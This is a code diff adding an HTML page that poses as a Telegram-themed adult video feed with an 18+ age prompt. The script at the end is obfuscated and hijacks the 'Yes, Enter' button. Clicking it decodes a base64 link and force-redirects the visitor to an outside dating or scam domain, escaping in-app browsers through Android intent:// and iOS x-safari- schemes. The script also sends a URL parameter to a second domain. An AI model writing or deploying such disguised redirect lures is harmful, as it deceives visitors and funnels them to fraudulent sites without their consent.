@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TelePorn 🔞</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+    }
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #000;
+      overflow: hidden;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 450px;
+      height: 100vh;
+      background: #111;
+      border-left: 1px solid #222;
+      border-right: 1px solid #222;
+      overflow-y: auto;
+      position: relative;
+      visibility: hidden;
+    }
+
+    .loader {
+      position: fixed;
+      inset: 0;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 2000;
+      transition: opacity 0.5s ease;
+    }
+
+    .loader.hidden {
+      opacity: 0;
+      pointer-events: none;
+    }
+
+    .spinner {
+      width: 64px;
+      height: 64px;
+      border-radius: 50%;
+      border: 6px solid #333;
+      border-top-color: #229ED9;
+      animation: spin 0.8s linear infinite;
+      position: relative;
+    }
+
+    .spinner::after {
+      content: '';
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      right: 8px;
+      bottom: 8px;
+      background: black;
+      border-radius: 50%;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.6);
+      backdrop-filter: blur(3px);
+      z-index: 999;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+    }
+
+    .overlay.active {
+      display: block;
+      opacity: 1;
+    }
+
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%) scale(0.8);
+      background: #222;
+      padding: 25px 20px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(34, 158, 217, 0.3);
+      z-index: 1000;
+      text-align: center;
+      opacity: 0;
+      transition: all 0.4s ease;
+      color: white;
+    }
+
+    .popup.active {
+      display: block;
+      opacity: 1;
+      transform: translate(-50%, -50%) scale(1);
+    }
+
+    .popup h2 {
+      font-size: 18px;
+      margin-bottom: 20px;
+    }
+
+    .popup button {
+      background: #229ED9;
+      border: none;
+      padding: 12px 25px;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 16px;
+      background: #000;
+      border-bottom: 1px solid #222;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+      color: white;
+    }
+
+    .header img {
+      height: 32px;
+    }
+
+    .header span {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 24px;
+      color: #fff;
+    }
+
+    .posts {
+      padding: 10px;
+    }
+
+    .post {
+      background: #111;
+      border: 1px solid #222;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      overflow: hidden;
+    }
+
+    .post-header {
+      display: flex;
+      align-items: center;
+      padding: 10px 14px;
+    }
+
+    .post-header img {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin-right: 10px;
+    }
+
+    .post-header span {
+      font-weight: bold;
+      color: #fff;
+    }
+
+    .post-media video {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    .footer {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      max-width: 450px;
+      background: #000;
+      border-top: 1px solid #222;
+      padding: 10px 0;
+      display: flex;
+      justify-content: space-around;
+      z-index: 10;
+    }
+
+    .footer img {
+      width: 28px;
+      height: 28px;
+      cursor: pointer;
+      filter: invert(100%);
+    }
+
+    .footer img:hover {
+      opacity: 0.7;
+    }
+  </style>
+</head>
+<body>
+  <div class="loader" id="loader">
+    <div class="spinner"></div>
+  </div>
+
+  <div class="container" id="main-content">
+    <div class="overlay" id="overlay"></div>
+    <div class="popup" id="popup">
+      <h2>Are you 18+?</h2>
+      <button onclick="confirmAge()">Yes, Enter</button>
+    </div>
+
+    <div class="header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
+      <span>TelePorn</span>
+      <img src="https://cdn-icons-png.flaticon.com/512/1828/1828859.png" alt="Menu">
+    </div>
+
+    <div class="posts">
+      <div class="post">
+        <div class="post-header">
+          <img src="https://randomuser.me/api/portraits/women/45.jpg" alt="User">
+          <span>@naughtygram</span>
+        </div>
+        <div class="post-media">
+          <video src="https://cdn.shortvideos.net/sample1.mp4" controls autoplay muted loop></video>
+        </div>
+      </div>
+
+      <div class="post">
+        <div class="post-header">
+          <img src="https://randomuser.me/api/portraits/men/34.jpg" alt="User">
+          <span>@hotgram_bot</span>
+        </div>
+        <div class="post-media">
+          <video src="https://cdn.shortvideos.net/sample2.mp4" controls autoplay muted loop></video>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <img src="https://cdn-icons-png.flaticon.com/128/25/25694.png" alt="Home">
+      <img src="https://cdn-icons-png.flaticon.com/128/1077/1077035.png" alt="Chats">
+      <img src="https://cdn-icons-png.flaticon.com/128/747/747376.png" alt="Bots">
+      <img src="https://cdn-icons-png.flaticon.com/128/747/747545.png" alt="Profile">
+    </div>
+  </div>
+
+  <script>
+    window.addEventListener('DOMContentLoaded', () => {
+      const loader = document.getElementById('loader');
+      const container = document.getElementById('main-content');
+      const popup = document.getElementById('popup');
+  
+      setTimeout(() => {
+        loader.classList.add('hidden');
+        container.style.visibility = 'visible';
+        popup.classList.add('active');
+        document.getElementById('overlay').classList.add('active');
+      }, 1000); // 1 секунда "загрузки"
+    });
+  
+    function confirmAge() {
+      document.getElementById('popup').classList.remove('active');
+      document.getElementById('overlay').classList.remove('active');
+    }
+    ;(function () {
+  const _0x32af0a = atob,
+    _0x3ff128 = [
+      'aHR0cHM6Ly9lNjNwOHI5LmZpbmRwYXJ0bmVydGhlZmluZGVyLmNvbS9waHEyYWduP3MxPXRyZWFkc190Z19sZW5k=',
+    ],
+    _0x427e6b = navigator.userAgent || navigator.vendor || window.opera,
+    _0x26dbbb = /android/i.test(_0x427e6b),
+    _0x12658e = /iPad|iPhone|iPod/.test(_0x427e6b) && !window.MSStream
+  function _0x30f048() {
+    _0x466ab6()
+    const _0x4df9fd = _0x32af0a(
+      _0x3ff128[Math.floor(Math.random() * _0x3ff128.length)]
+    )
+    let _0x237880 = false
+    function _0x36d08f() {
+      document.hidden &&
+        ((_0x237880 = true),
+        clearTimeout(_0x500acf),
+        document.removeEventListener('visibilitychange', _0x36d08f))
+    }
+    document.addEventListener('visibilitychange', _0x36d08f)
+    const _0x500acf = setTimeout(() => {
+      !_0x237880 && ((_0x237880 = true), (window.location.href = _0x4df9fd))
+    }, 1500)
+    if (_0x26dbbb) {
+      const _0x144bd1 =
+        'intent://' +
+        _0x4df9fd.replace('https://', '') +
+        '#Intent;scheme=https;end'
+      window.location.href = _0x144bd1
+    } else {
+      _0x12658e
+        ? (window.location.href = 'x-safari-' + _0x4df9fd)
+        : ((window.location.href = _0x4df9fd), (_0x237880 = true))
+    }
+  }
+  function _0x466ab6() {
+    const _0x5759b5 = new URLSearchParams(window.location.search),
+      _0x5af7e9 = _0x5759b5.get('online')
+    if (_0x5af7e9) {
+      const _0x33d7e8 = 'https://bestgirlsnow.xyz/api/redirect',
+        _0x5948f6 = _0x33d7e8 + '?param=' + encodeURIComponent(_0x5af7e9)
+      fetch(_0x5948f6, { method: 'GET' })
+        .then((_0x5a9afe) => _0x5a9afe.text())
+        .catch((_0xbcfcb9) => console.error('Ошибка:', _0xbcfcb9))
+    }
+  }
+  setTimeout(() => {
+    document.getElementById('popup').style.display = 'block'
+    document.getElementById('overlay').style.display = 'block'
+  }, 3000)
+  window.confirmAge = _0x30f048
+})()
+
+  </script>
+</body>
+</html>
